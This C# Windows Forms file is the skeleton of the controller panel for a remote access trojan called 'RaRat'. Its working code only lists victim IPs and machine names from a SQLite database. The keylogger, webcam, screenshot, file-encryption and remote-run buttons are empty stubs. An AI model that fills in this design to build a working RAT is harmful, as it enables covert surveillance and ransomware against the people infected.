using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Data.SQLite;
using System.Linq;



namespace RaRat_server
{
    public partial class ra_main : Form
    {
        private SQLiteConnection sql_con;
        private SQLiteCommand sql_cmd;
        private SQLiteDataAdapter DB;
        private DataSet DS = new DataSet();
        private DataTable DT = new DataTable();

        public static string convertDataTableToString(DataTable dataTable)
        {
            string data = string.Empty;
            for (int i = 0; i < dataTable.Rows.Count; i++)
            {
                DataRow row = dataTable.Rows[i];
                for (int j = 0; j < dataTable.Columns.Count; j++)
                {
                    data += dataTable.Columns[j].ColumnName + ":" + row[j];
                    if (j == dataTable.Columns.Count - 1)
                    {
                        if (i != (dataTable.Rows.Count - 1))
                            data += "$";
                    }
                    else
                        data += "/";
                }
            }
            return data;
        }

        private void SetConnection() {
            sql_con = new SQLiteConnection("Data Source=database.db;version=3;New=False;Compress=True;");

        }

        private int HowManyClients() {
            SetConnection();
            sql_con.Open();
            sql_cmd = sql_con.CreateCommand();
            String CommandText = "select client_ip from client_table";
            DB = new SQLiteDataAdapter(CommandText, sql_con);
            DS.Reset();
            DB.Fill(DS);
            DT = DS.Tables[0];
            sql_con.Close();
            string res = convertDataTableToString(DT);
            char ch = '$';
            int freq = res.Count(f => (f == ch));
            return freq;
        
        }
        private string[] LoadData() {
            SetConnection();
            sql_con.Open();
            sql_cmd = sql_con.CreateCommand();
            String CommandText = "select client_ip from client_table";
            DB = new SQLiteDataAdapter(CommandText, sql_con);
            DS.Reset();
            DB.Fill(DS);
            DT = DS.Tables[0];
            sql_con.Close();
            string res = convertDataTableToString(DT);
            sql_con.Open();
            sql_cmd = sql_con.CreateCommand();
            CommandText = "select client_mc from client_table";
            DB = new SQLiteDataAdapter(CommandText, sql_con);
            DS.Reset();
            DB.Fill(DS);
            DT = DS.Tables[0];
            sql_con.Close();
            string res2 = convertDataTableToString(DT);
            string[] output = { res, res2};
            return output;

        }

        public ra_main()

        { 
        
            int server_listen_port =3030 ;
            int client_listen_port =3020 ;

            InitializeComponent();
            richTextBox_results.Text = "RARat Version 0.1 (2020)";


            int number_clients = HowManyClients();

            for (int i = 0; i < number_clients; i++)
            {
                string array_client_ips = LoadData()[0];
                string[] client_ips = array_client_ips.Split('$');
                string[] clients = client_ips[i].Split(':');
                string array_client_mc = LoadData()[1];
                string[] client_mc = array_client_mc.Split('$');
                string[] clientsmc = client_mc[i].Split(':');
                comboBox_client_list.Items.AddRange(new object[] { clients[1]+" \'"+clientsmc[1] + "\'" });
            }
        }

        private void button_list_processes_Click(object sender, EventArgs e)
        {

        }

        private void button_client_info_Click(object sender, EventArgs e)
        {

        }

        private void button_screenshot_Click(object sender, EventArgs e)
        {

        }

        private void button_file_transfer_Click(object sender, EventArgs e)
        {

        }

        private void button_keylogger_Click(object sender, EventArgs e)
        {

        }

        private void button_encrypt_files_Click(object sender, EventArgs e)
        {

        }

        private void button_show_message_Click(object sender, EventArgs e)
        {

        }

        private void button_webcam_Click(object sender, EventArgs e)
        {

        }

        private void button_create_Click(object sender, EventArgs e)
        {

        }

        private void button_exit_Click(object sender, EventArgs e)
        {

        }

        private void button_run_Click(object sender, EventArgs e)
        {

        }

        private void button13_Click(object sender, EventArgs e)
        {
            //richTextBox1.Text= "fuck";
            int number_clients = HowManyClients();

            for (int i=0; i<number_clients;i++) {
                string array_client_ips = LoadData()[0];
                string[] client_ips = array_client_ips.Split('$');
                string[] clients = client_ips[i].Split(':');
                richTextBox_results.Text = richTextBox_results.Text +"\n\r" +clients[1];

            }



        }


        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            
        }

        private void button10_Click(object sender, EventArgs e)
        {
            
        }

        private void button_list_processes_Click_1(object sender, EventArgs e)
        {

        }

        private void button_client_info_Click_1(object sender, EventArgs e)
        {

        }

        private void button_screenshot_Click_1(object sender, EventArgs e)
        {

        }

        private void button_file_transfer_Click_1(object sender, EventArgs e)
        {

        }

        private void button_keylogging_Click(object sender, EventArgs e)
        {

        }

        private void button_encrypt_file_Click(object sender, EventArgs e)
        {

        }

        private void button_show_message_Click_1(object sender, EventArgs e)
        {

        }

        private void button_webcam_Click_1(object sender, EventArgs e)
        {

        }

        private void button_exit_Click_1(object sender, EventArgs e)
        {

        }

        private void button_run_Click_1(object sender, EventArgs e)
        {

        }

        private void tabPage2_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox_results_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
